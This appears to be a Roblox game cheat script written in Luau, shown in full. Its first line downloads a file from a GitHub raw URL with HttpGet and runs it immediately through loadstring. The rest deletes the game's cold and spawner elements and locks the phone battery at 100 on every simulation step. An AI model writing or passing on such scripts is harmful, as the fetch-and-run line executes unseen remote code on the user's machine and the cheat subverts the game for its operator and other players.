loadstring(game:HttpGet("https://raw.githubusercontent.com/noctryxzen/Getter/refs/heads/main/GetFS.luau"))()
GetService.Players.LocalPlayer.PlayerGui.maingame.realgame.cold:Destroy()
GetService.Players.LocalPlayer.PlayerGui.maingame.realgame.spawners:Destroy()
GetService.RunService.PreSimulation:Connect(function()
  GetService.Players.LocalPlayer.PlayerGui.maingame.realgame.phonebattery.Value = 100
end)
